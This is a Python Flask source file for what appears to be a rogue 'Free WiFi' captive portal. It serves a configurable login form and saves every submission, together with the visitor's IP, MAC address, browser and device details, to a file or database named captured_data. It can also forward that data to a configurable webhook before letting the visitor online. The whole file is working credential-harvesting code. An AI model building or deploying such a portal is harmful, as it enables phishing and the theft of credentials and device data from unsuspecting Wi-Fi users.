from flask import Flask, request, render_template, redirect, url_for, jsonify
import json
import sqlite3
import os
import datetime
import requests
from user_agents import parse
import logging
import subprocess

class CaptivePortalApp:
    def __init__(self, config_manager, firewall_manager):
        self.config = config_manager
        self.firewall = firewall_manager
        self.app = Flask(__name__, template_folder='../templates')
        self.setup_routes()
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)

    def setup_routes(self):
        @self.app.route('/')
        def index():
            return self.serve_login_page()

        @self.app.route('/login', methods=['POST'])
        def login():
            return self.handle_login()

        @self.app.route('/success')
        def success():
            return self.serve_success_page()

        @self.app.errorhandler(404)
        def catch_all(e):
          
         
            return redirect(url_for('index'))

    def serve_login_page(self):
        ssid = self.config.get('ap_settings.ssid', 'Free WiFi')
        form_fields = self.config.get('portal_settings.login_form_fields', [])
        
        
        user_agent = request.headers.get('User-Agent', '')
        device_info = self.detect_device(user_agent)
        
        return render_template('login.html', ssid=ssid, form_fields=form_fields, device_info=device_info)

    def handle_login(self):

        form_data = dict(request.form)
        
        user_ip = request.remote_addr
        device_info = {
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', ''),
            'timestamp': datetime.datetime.now().isoformat(),
            'mac_address': self.get_mac_from_ip(request.remote_addr),
            'device_type': self.detect_device(request.headers.get('User-Agent', ''))
        }
        

        self.log_captured_data(form_data, device_info)
        
    
        if self.firewall:
            self.firewall.authenticate_user(user_ip)
        
        if self.config.get('webhook_settings.enable_webhook', False):
            self.send_to_webhook(form_data, device_info)
        
        redirect_url = self.config.get('portal_settings.redirect_url_after_login', '/success')
        return redirect(redirect_url)

    def serve_success_page(self):
        return '''
        <html>
        <head>
            <title>Connected</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f0f2f5; }
                .success { background-color: #d4edda; color: #155724; padding: 20px; border-radius: 8px; display: inline-block; }
            </style>
        </head>
        <body>
            <div class="success">
                <h1>✓ Connected Successfully!</h1>
                <p>You are now connected to the internet.</p>
                <p>Enjoy your browsing experience!</p>
            </div>
        </body>
        </html>
        '''

    def detect_device(self, user_agent):
        try:
            parsed_ua = parse(user_agent)
            device_type = 'unknown'
            
            if 'Android' in user_agent:
                device_type = 'android'
            elif 'iPhone' in user_agent or 'iPad' in user_agent:
                device_type = 'ios'
            elif 'Windows' in user_agent:
                device_type = 'windows'
            elif 'Macintosh' in user_agent:
                device_type = 'mac'
            elif 'Linux' in user_agent:
                device_type = 'linux'
            
            return {
                'type': device_type,
                'browser': parsed_ua.browser.family,
                'browser_version': parsed_ua.browser.version_string,
                'os': parsed_ua.os.family,
                'os_version': parsed_ua.os.version_string
            }
        except Exception as e:
            self.logger.error(f"Error parsing user agent: {e}")
            return {'type': 'unknown'}

    def get_mac_from_ip(self, ip):
        try:
           
            result = subprocess.run(['arp', '-n', ip], text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            return parts[2]  
        except Exception as e:
            self.logger.error(f"Error getting MAC address for {ip}: {e}")
        return 'unknown'

    def log_captured_data(self, form_data, device_info):
        if not self.config.get('logging_settings.enable_data_logging', True):
            return

        log_format = self.config.get('logging_settings.log_format', 'json')
        log_file = self.config.get('logging_settings.log_file', 'logs/captured_data.json')
        

        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        
        log_entry = {
            'form_data': form_data,
            'device_info': device_info
        }
        
        if log_format == 'json':
            self.log_to_json(log_entry, log_file)
        elif log_format == 'sqlite':
            self.log_to_sqlite(log_entry, log_file.replace('.json', '.db'))

    def log_to_json(self, log_entry, log_file):
        try:
            data = []
            if os.path.exists(log_file):
                try:
                    with open(log_file, 'r') as f:
                        data = json.load(f)
                        if not isinstance(data, list):
                            data = []
                except json.JSONDecodeError:
                    data = []
            

            data.append(log_entry)
            

            with open(log_file, 'w') as f:
                json.dump(data, f, indent=2)
                
            self.logger.info(f"Logged data to {log_file}")
        except Exception as e:
            self.logger.error(f"Error logging to JSON: {e}")

    def log_to_sqlite(self, log_entry, db_file):
        try:
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS captured_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    ip TEXT,
                    mac_address TEXT,
                    user_agent TEXT,
                    device_type TEXT,
                    form_data TEXT
                )
            ''')
            
            cursor.execute('''
                INSERT INTO captured_data 
                (timestamp, ip, mac_address, user_agent, device_type, form_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                log_entry['device_info']['timestamp'],
                log_entry['device_info']['ip'],
                log_entry['device_info']['mac_address'],
                log_entry['device_info']['user_agent'],
                log_entry['device_info']['device_type']['type'],
                json.dumps(log_entry['form_data'])
            ))
            
            conn.commit()
            conn.close()
            
            self.logger.info(f"Logged data to SQLite database {db_file}")
        except Exception as e:
            self.logger.error(f"Error logging to SQLite: {e}")

    def send_to_webhook(self, form_data, device_info):
        webhook_url = self.config.get('webhook_settings.webhook_url', '')
        if not webhook_url:
            return
        
        try:
            payload = {
                'form_data': form_data,
                'device_info': device_info
            }
            
            response = requests.post(webhook_url, json=payload, timeout=10)
            if response.status_code == 200:
                self.logger.info(f"Successfully sent data to webhook: {webhook_url}")
            else:
                self.logger.warning(f"Webhook returned status code: {response.status_code}")
                
        except Exception as e:
            self.logger.error(f"Error sending to webhook: {e}")

    def run(self, host='0.0.0.0', port=80, debug=False):
        self.app.run(host=host, port=port, debug=debug)

if __name__ == '__main__':

    import sys
    sys.path.append('..')
    from config.config_manager import ConfigManager
    
  
    config = ConfigManager()
    
    class MockFirewall:
        def authenticate_user(self, ip):
            print(f"[TEST] Mock firewall authenticating {ip}")
            
    portal = CaptivePortalApp(config, MockFirewall())
    portal.run(debug=True)

